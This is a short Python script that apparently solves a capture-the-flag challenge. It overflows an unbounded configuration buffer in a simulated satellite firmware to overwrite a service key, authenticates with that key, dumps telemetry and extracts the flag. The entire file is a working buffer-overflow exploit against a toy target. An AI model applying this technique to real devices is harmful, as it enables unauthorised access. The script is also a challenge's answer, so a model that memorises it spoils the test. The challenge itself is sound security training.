#!/usr/bin/env python3
"""Overwrite the service key with the unbounded CFG command and dump TLM."""
from pathlib import Path
import re
import sys

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
import foundation_one_fw as firmware  # noqa: E402

key = b'KEY!'
payload = b'A' * 16 + key  # mem[16:20] is the random service key.
sat = firmware.Sat()
assert sat.cfg(payload) == b'CFG LOADED 20 bytes'
assert sat.auth(key) == b'MAINT OK'
dump = sat.dump()
match = re.search(rb'GAIANSPACE\{[^}]+\}', dump)
assert match
print('Protocol commands:')
print('CFG', payload.hex())
print('AUTH', key.hex())
print('DUMP')
print(match[0].decode())
